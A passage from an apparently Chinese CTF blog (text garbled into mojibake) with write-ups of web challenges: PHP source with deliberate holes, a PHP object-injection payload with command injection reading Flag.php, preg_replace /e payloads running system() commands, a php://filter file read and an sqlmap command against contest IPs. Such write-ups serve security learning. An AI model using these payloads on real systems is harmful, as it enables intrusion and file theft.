class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>è¿™é“é¢˜æ˜¯hitcon17çš„babyfirstçš„ä¸€é“æ”¹ç¼–é¢˜,å¤šå‡ºæ¥ä¸€ä¸ªwaf,å…·ä½“å†…å®¹æœªçŸ¥,ç„¶åcurlè¢«banæ‰äº†,ç›´æ¥å†™ä¸€ä¸ªshellä¸Šå»,å¤šæ¬¡å†™,å…·ä½“æ–¹æ¡ˆæˆ‘åç»­ä¼šå†™ä¸€ç¯‡hitcon17çš„babyfirst,é‡Œé¢å·®ä¸å¤šå°±æœ‰ç­”æ¡ˆ ....... å…³äºwafçš„é—®é¢˜..ç”±äºæ²¡æœ‰ç¯å¢ƒæµ‹è¯•..æš‚æ—¶ç•™ä¸€ä»½å¤§ä½¬çš„wp,ä»¥åå‚è€ƒå§...è¿™é‡Œå°±ä¸æ”¾å‡ºäº†</p>]]></content>
      
      
      <categories>
          
          <category> webç¯‡ </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>èµ›åšåœ°çƒæ¯web(éwafç¯‡</title>
      <link href="/2018/01/22/%E8%B5%9B%E5%8D%9A%E5%9C%B0%E7%90%83%E6%9D%AFweb%E9%9D%9Ewaf%E7%AF%87/"/>
      <url>/2018/01/22/%E8%B5%9B%E5%8D%9A%E5%9C%B0%E7%90%83%E6%9D%AFweb%E9%9D%9Ewaf%E7%AF%87/</url>
      
        <content type="html"><![CDATA[<p>emmmm,å°±çœ‹ç€dalaoä»¬æ‰“...æˆ‘å…¨ç¨‹åˆ’æ°´...æ„Ÿè§‰è¿˜æ˜¯é¢˜ç›®è§å¾—å°‘,å¤šçœ‹ä¸€çœ‹å¤šæ€»ç»“æ€»ç»“å§...è¿˜æœ‰..ä¹–ä¹–å§å§å¤ªå¼ºäº†!</p><h4 id="å¤§é‡è®¾å¤‡æŠ¥è¡¨ä¸è§äº†ç­¾é“é¢˜">å¤§é‡è®¾å¤‡æŠ¥è¡¨ä¸è§äº†ï¼ˆç­¾é“é¢˜ï¼‰</h4><h5 id="äº‘å¹³å°æŠ¥è¡¨ä¸­å¿ƒæ”¶é›†äº†è®¾å¤‡ç®¡ç†åŸºç¡€æœåŠ¡çš„æ•°æ®ä½†æ˜¯æ•°æ®è¢«åˆ é™¤äº†åªæœ‰ä¸€å¤„ç•™ä¸‹äº†å…¥ä¾µè€…çš„ç—•è¿¹">äº‘å¹³å°æŠ¥è¡¨ä¸­å¿ƒæ”¶é›†äº†è®¾å¤‡ç®¡ç†åŸºç¡€æœåŠ¡çš„æ•°æ®ï¼Œä½†æ˜¯æ•°æ®è¢«åˆ é™¤äº†ï¼Œåªæœ‰ä¸€å¤„ç•™ä¸‹äº†å…¥ä¾µè€…çš„ç—•è¿¹ã€‚</h5><h5 id="http120.27.14.7320006"><a href="http://120.27.14.73:20006/" title="http://120.27.14.73:20006/">http://120.27.14.73:20006/</a></h5><p>è¿™ä¸ªé¢˜å…¶å®æ²¡å•¥æ„æ€....çœ‹äº†åŠå¤©éƒ½ä¸çŸ¥é“æ€ä¹ˆå†™,åæ¥å¶å§å§æ‰«idæ‰«åˆ°2333å‘ç°çš„flag...æˆ‘å°±å¾ˆæ— è¯­... flag{2333_bao_pO_OOOO0o_o0OOO}</p><h4 id="å·¥æ§ç³»ç»Ÿçš„æ•æ„Ÿæ¶ˆæ¯é­æ³„æ¼">å·¥æ§ç³»ç»Ÿçš„æ•æ„Ÿæ¶ˆæ¯é­æ³„æ¼</h4><h5 id="äº‘å¹³å°æ¶ˆæ¯ä¸­å¿ƒæ³„æ¼äº†ä¸è¯¥æ³„æ¼çš„æ¶ˆæ¯å¯¼è‡´ç³»ç»Ÿå¯ä»¥è¢«å…¥ä¾µ">äº‘å¹³å°æ¶ˆæ¯ä¸­å¿ƒï¼Œæ³„æ¼äº†ä¸è¯¥æ³„æ¼çš„æ¶ˆæ¯ã€‚å¯¼è‡´ç³»ç»Ÿå¯ä»¥è¢«å…¥ä¾µã€‚</h5><h5 id="http47.104.99.23120003"><a href="http://47.104.99.231:20003/" title="http://47.104.99.231:20003/">http://47.104.99.231:20003/</a></h5><p><img src="/images/2018/01/1.png" alt="blacsheep" /> å‘ç°.gitæ³„æ¼,githackæ‹¿æºç  <img src="/images/2018/01/2.png" alt="blacsheep" /> index2.phpçš„ä¸»è¦ä»£ç :</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;class.php&#x27;</span>;</span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;waf.php&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(@<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>])&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="title function_ invoke__">waf</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="string">&quot;Welcome&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>] === <span class="string">&#x27;1&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">include</span> <span class="string">&#x27;welcome/nothing.php&#x27;</span>;</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$secret</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;secret&#x27;</span>];</span><br><span class="line"><span class="variable">$ad</span>  = <span class="variable">$_GET</span>[<span class="string">&#x27;ad&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$ad</span>))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">ereg</span>(<span class="string">&quot;^[a-zA-Z0-9]+$&quot;</span>, <span class="variable">$ad</span>) === <span class="literal">FALSE</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;script&gt;alert(&quot;Sorry ! Again !&quot;)&lt;/script&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">elseif</span>(<span class="title function_ invoke__">strpos</span>(<span class="variable">$ad</span>, <span class="string">&#x27;--&#x27;</span>) !== <span class="literal">FALSE</span>)</span><br><span class="line">    &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;Ok Evrything will be fine!&lt;br &gt;&lt;br &gt;&quot;</span>;</span><br><span class="line">                <span class="keyword">if</span> (<span class="title function_ invoke__">stripos</span>(<span class="variable">$secret</span>, <span class="string">&#x27;./&#x27;</span>) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="keyword">die</span>();</span><br><span class="line">                &#125;</span><br><span class="line">        <span class="title function_ invoke__">unserialize</span>(<span class="variable">$secret</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;script&gt;alert(&quot;Sorry ! You must have --&quot;)&lt;/script&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$file</span> == <span class="string">&quot;Welcome&quot;</span>)&#123;</span><br><span class="line">    <span class="keyword">require_once</span> <span class="string">&#x27;welcome/welcome.php&#x27;</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">file_exists</span>(<span class="string">&quot;./import/<span class="subst">$file</span>.php&quot;</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;The file does not exit !&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">elseif</span>(!<span class="title function_ invoke__">system</span>(<span class="string">&quot;php ./import/<span class="subst">$file</span>.php&quot;</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;Something was wrong ! But it is ok! ignore it :)&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ç„¶åclass.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Record</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>=<span class="string">&quot;Welcome&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;file = <span class="variable">$file</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;file = <span class="string">&#x27;sleep.txt&#x27;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">array</span>(<span class="string">&#x27;file&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;file = <span class="string">&#x27;wakeup.txt&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;file != <span class="string">&#x27;wakeup.txt&#x27;</span> &amp;&amp; <span class="variable language_">$this</span>-&gt;file != <span class="string">&#x27;sleep.txt&#x27;</span> &amp;&amp; <span class="variable language_">$this</span>-&gt;file != <span class="string">&#x27;Welcome&#x27;</span>) &#123;</span><br><span class="line">            <span class="title function_ invoke__">system</span>(<span class="string">&quot;php ./import/<span class="subst">$this</span>-&gt;file.php&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;?php Something destroyed ?&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$b</span> =<span class="keyword">new</span> <span class="title class_">Record</span>(<span class="string">&#x27;Welcome&#x27;</span>);</span><br><span class="line"><span class="keyword">unset</span>(<span class="variable">$b</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>æ³¨æ„åˆ°importæ–‡ä»¶å¤¹,ç„¶ååœ¨importæ–‡ä»¶å¤¹é‡Œé¢å‘ç°äº†Flag.php,çœ‹äº†ä¸€ä¸‹æºç ,å‘ç°flagæ˜¯åœ¨æ³¨é‡Šé‡Œé¢</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="comment">//$flag = &quot;flag&#123;xxxxxxxxxxxxx&#125;&quot;;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Flag is !&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>æ‰€ä»¥ç›´æ¥å»æ‰§è¡ŒFlag.phpè¿˜ä¸è¡Œ,å¿…é¡»è¯»åˆ°æºç æ‰å¯ä»¥ å›å¤´çœ‹ä¸€ä¸‹æºç  fileå’Œidä¸ç®¡,æ²¡å•¥ç”¨,<span class="math inline">\(adå¯ä»¥ç”¨%00è¿‡,æ‰€ä»¥\)</span>ad=123%00-- ç„¶åsecretè¿™é‡Œç”¨åˆ°ååºåˆ—åŒ–,ä½†æ˜¯æ¶‰åŠåˆ°ä¸€ä¸ª__wakeupçš„é—®é¢˜,è¿™é‡Œå¯ä»¥æ”¹å˜å±æ€§å€¼ç»•è¿‡,æ‰€ä»¥å†™ä¸ªphp</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Record</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>=<span class="string">&quot;Welcome&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;file = <span class="variable">$file</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Record</span>(<span class="string">&quot;Flag.php &amp;&amp; echo `cat /var/www/html/import/Flag.php`&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure><p>å¾—åˆ°åºåˆ—åŒ–åçš„å€¼:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">6</span>:<span class="string">&quot;Record&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;file&quot;</span>;s:<span class="number">52</span>:<span class="string">&quot;Flag.php &amp;&amp; echo `cat /var/www/html/import/Flag.php`&quot;</span>;&#125;</span><br></pre></td></tr></table></figure><p>ç„¶åæŠŠrecordåé¢çš„1æ”¹æˆ10(ç»•è¿‡__wakeup),ä¼ å‚çš„æ—¶å€™è®°å¾—urlencodeä¸€ä¸‹,ä¹Ÿå°±æ˜¯ O%3A6%3A%22Record%22%3A10%3A%7Bs%3A4%3A%22file%22%3Bs%3A52%3A%22 Flag.php+%26%26+echo+%60cat+%2Fvar%2Fwww%2Fhtml%2Fimport%2FFlag. php%60%22%3B%7D æ‰€ä»¥å»è®¿é—®ä¸€ä¸‹ <a href="http://47.104.99.231:20003/index2.php?file=Flag&amp;ad=123%00--&amp;secret=O%3A6%3A%22Record%22%3A10%3A%7Bs%3A4%3A%22file%22%3Bs%3A52%3A%22Flag.php+%26%26+echo+%60cat+%2Fvar%2Fwww%2Fhtml%2Fimport%2FFlag.php%60%22%3B%7D" title="flag!">flag!</a> çœ‹æºç æ‹¿flag.jpg $flag = "flag{g_i_i_t_is_unsafe_ahhhahahah}</p><h4 id="å·¥æ§äº‘ç®¡ç†ç³»ç»Ÿè®¾å¤‡ç»´æŠ¤ä¸­å¿ƒè¢«æ¤å…¥åé—¨">å·¥æ§äº‘ç®¡ç†ç³»ç»Ÿè®¾å¤‡ç»´æŠ¤ä¸­å¿ƒè¢«æ¤å…¥åé—¨</h4><h5 id="å…¶ä»–ç ´åè€…ä¼šåˆ©ç”¨å·¥æ§äº‘ç®¡ç†ç³»ç»Ÿè®¾å¤‡ç»´æŠ¤ä¸­å¿ƒçš„åé—¨å…¥ä¾µç³»ç»Ÿ">å…¶ä»–ç ´åè€…ä¼šåˆ©ç”¨å·¥æ§äº‘ç®¡ç†ç³»ç»Ÿè®¾å¤‡ç»´æŠ¤ä¸­å¿ƒçš„åé—¨å…¥ä¾µç³»ç»Ÿ</h5><h5 id="http47.104.74.20920005"><a href="http://47.104.74.209:20005" title="http://47.104.74.209:20005">http://47.104.74.209:20005</a></h5><p>é¦–å…ˆçœ‹åˆ°http://47.104.74.209:20005/index.php?page=index ç„¶åçŒœæƒ³æœ‰æ–‡ä»¶åŒ…å«,ç„¶åè¯»ä¸€ä¸‹ http://47.104.74.209:20005/index.php? page=php://filter/read=convert.base64-encode/resource=index.php æ‹¿åˆ°æºç  å‘ç°æœ‰ä¸ªpreg_replaceçš„åé—¨</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>] === <span class="string">&#x27;127.0.0.1&#x27;</span>) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br &gt;Welcome My Admin ! &lt;br &gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$pattern</span> = <span class="variable">$_GET</span>[pat];</span><br><span class="line">    <span class="variable">$replacement</span> = <span class="variable">$_GET</span>[rep];</span><br><span class="line">    <span class="variable">$subject</span> = <span class="variable">$_GET</span>[sub];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$pattern</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$replacement</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$subject</span>)) &#123;</span><br><span class="line">        <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$pattern</span>, <span class="variable">$replacement</span>, <span class="variable">$subject</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªåˆ©ç”¨å°±æ˜¯replaceçš„patternåé¢å¦‚æœæœ‰/eçš„è¯,replacementçš„è¯­å¥æ˜¯ä¼šå¾—åˆ°æ‰§è¡Œçš„,æ‰€ä»¥æˆ‘ä»¬å°± ç›´æ¥pat=/test/e&amp;rep=system("ls")&amp;sub=testå‘ç°ä¸€ä¸ª s3chahahaDir é‚£ç»§ç»­pat=/test/e&amp;rep=system("cd+s3chahahaDir+%26%26+ls")&amp;sub=testå‘ç°ä¸€ä¸ªflagæ–‡ä»¶å¤¹,ç»§ç»­è¿›å…¥flagæ–‡ä»¶å¤¹å‘ç°ä¸€ä¸ªflag.php ç„¶åæˆ‘ä»¬ pat=/test/e&amp;rep=system("cat%20s3chahahaDir/flag/flag.php")&amp;sub=test æ‹¿åˆ°flag $flag = 'flag{SecuriTY_Preg_eee3}</p><h4 id="å·¥æ§ç®¡ç†ç³»ç»Ÿæ–°ç‰ˆæœ¬">å·¥æ§ç®¡ç†ç³»ç»Ÿæ–°ç‰ˆæœ¬</h4><h5 id="äº‘å·¥æ§ç®¡ç†ç³»ç»Ÿæ–°æ·»åŠ çš„ç™»å½•å’Œæ³¨å†Œé¡µé¢å­˜åœ¨æ¼æ´è¯·æ‰¾å‡ºflag">äº‘å·¥æ§ç®¡ç†ç³»ç»Ÿæ–°æ·»åŠ çš„ç™»å½•å’Œæ³¨å†Œé¡µé¢å­˜åœ¨æ¼æ´ï¼Œè¯·æ‰¾å‡ºflagã€‚</h5><h5 id="http47.104.1.17320004"><a href="http://47.104.1.173:20004/" title="http://47.104.1.173:20004/">http://47.104.1.173:20004/</a></h5><p>è¿™ä¸ªé¢˜å¯†ç æ‰¾å›é¡µé¢å­˜åœ¨æ³¨å…¥ sqlmapè·‘ sqlmap -u http://47.104.1.173:20004/findpwd.php --data "username=inject_here" --dbs ç„¶åbalabalaçš„å°±è·‘å‡ºæ¥äº† ç„¶åå»æ³¨å†ŒåŒåç”¨æˆ·å³å¯ç™»å½•æ‹¿åˆ°flag</p><h4 id="å·¥æ§äº‘ç®¡ç†ç³»ç»Ÿé¡¹ç›®ç®¡ç†é¡µé¢è§£ææ¼æ´">å·¥æ§äº‘ç®¡ç†ç³»ç»Ÿé¡¹ç›®ç®¡ç†é¡µé¢è§£ææ¼æ´</h4><h5 id="è¿™ä¸ªå·¥æ§äº‘ç®¡ç†ç³»ç»Ÿçš„è§£ææ¼æ´è¦é ç®¡ç†å‘˜å»ä¿®è¡¥">è¿™ä¸ªå·¥æ§äº‘ç®¡ç†ç³»ç»Ÿçš„è§£ææ¼æ´è¦é ç®¡ç†å‘˜å»ä¿®è¡¥ã€‚</h5><h5 id="http47.104.156.3220007"><a href="http://47.104.156.32:20007" title="http://47.104.156.32:20007">http://47.104.156.32:20007</a></h5><p>è¿™ä¸ªé¢˜ç»™å‡ºäº†æºç ,ä¸»è¦éƒ¨åˆ†å¦‚ä¸‹</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">     <span class="keyword">if</span> (<span class="variable">$_SESSION</span>[<span class="string">&#x27;admin&#x27;</span>]) &#123;</span><br><span class="line">       <span class="variable">$con</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;con&#x27;</span>];</span><br><span class="line">       <span class="variable">$file</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">       <span class="variable">$filename</span> = <span class="string">&quot;backup/&quot;</span>.<span class="variable">$file</span>;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/.+\.ph(p[3457]?ttml)$/i&#x27;</span>, <span class="variable">$filename</span>))&#123;</span><br><span class="line">          <span class="keyword">die</span>(<span class="string">&quot;Bad file extension&quot;</span>);</span><br><span class="line">       &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;uploaded&#x27;</span>);</span><br><span class="line">           <span class="variable">$f</span> = <span class="title function_ invoke__">fopen</span>(<span class="variable">$filename</span>, <span class="string">&#x27;w&#x27;</span>);</span><br><span class="line">           <span class="title function_ invoke__">fwrite</span>(<span class="variable">$f</span>, <span class="variable">$con</span>);</span><br><span class="line">           <span class="title function_ invoke__">fclose</span>(<span class="variable">$f</span>);</span><br><span class="line">       &#125;</span><br><span class="line">     &#125;</span><br><span class="line">     <span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="meta">&lt;?php</span></span><br><span class="line">      <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[id]) &amp;&amp; <span class="title function_ invoke__">floatval</span>(<span class="variable">$_GET</span>[id]) !== <span class="string">&#x27;1&#x27;</span> &amp;&amp; <span class="title function_ invoke__">substr</span>(<span class="variable">$_GET</span>[id], -<span class="number">1</span>) === <span class="string">&#x27;9&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">include</span> <span class="string">&#x27;config.php&#x27;</span>;</span><br><span class="line">        <span class="variable">$id</span> = <span class="title function_ invoke__">mysql_real_escape_string</span>(<span class="variable">$_GET</span>[id]);</span><br><span class="line">        <span class="variable">$sql</span>=<span class="string">&quot;select * from cetc007.user where id=&#x27;<span class="subst">$id</span>&#x27;&quot;</span>;</span><br><span class="line">        <span class="variable">$result</span> = <span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>);</span><br><span class="line">        <span class="variable">$result</span> = <span class="title function_ invoke__">mysql_fetch_object</span>(<span class="variable">$result</span>);</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$result</span> = False;</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span>(!<span class="variable">$result</span>)<span class="keyword">die</span>(<span class="string">&quot;&lt;br &gt;something wae wrong ! &lt;br&gt;&quot;</span>);</span><br><span class="line">      <span class="keyword">if</span>(<span class="variable">$result</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;id: &quot;</span>.<span class="variable">$result</span>-&gt;id.<span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;name:&quot;</span>.<span class="variable">$result</span>-&gt;user.<span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">        <span class="variable">$_SESSION</span>[<span class="string">&#x27;admin&#x27;</span>] = True;</span><br><span class="line">      &#125;</span><br><span class="line">     <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>é¦–å…ˆå¾—æ‹¿åˆ°ä¸€ä¸ªadminçš„session idä¸èƒ½å¤ªå¤§,å¦åˆ™æ•°æ®åº“æ‹¿ä¸å‡ºæ¥,ä½†æ˜¯floatval($_GET[id])!=='1',æœ«å°¾è¦æ±‚æ˜¯'9',æ‰€ä»¥è®¾ç½®id=1%009,è¿™é‡Œ%00ä¼šè¢«mysql_real_escape_stringç»™è½¬æˆ\0,ç„¶å\0åœ¨mysqlé‡Œé¢è·‘çš„è¯ä¼¼ä¹æ˜¯ä¼šè¢«è¯†åˆ«ä¸ºå­—ç¬¦ä¸²çš„ç»“å°¾çš„ ç»™å‡ ä¸ªå›¾ä½ ä»¬ä½“ä¼šä¸€ä¸‹ <img src="/images/2018/01/3.png" alt="blacsheep" /> <img src="/images/2018/01/4.png" alt="blacsheep" /> <img src="/images/2018/01/5.png" alt="blacsheep" /> <img src="/images/2018/01/6.png" alt="blacsheep" /> 